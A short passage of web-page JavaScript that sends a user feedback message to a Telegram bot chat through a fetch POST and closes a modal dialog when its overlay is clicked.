                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: botFeedbackPayload
                })
            })
            .then(res => console.log("Feedback dispatched successfully."))
            .catch(err => console.error("Feedback endpoint failed:", err));
        });
    }

    window.addEventListener('click', (e) => {
        if (e.target.classList.contains('modal-overlay')) {
            e.target.classList.remove('active');
        }
    });
});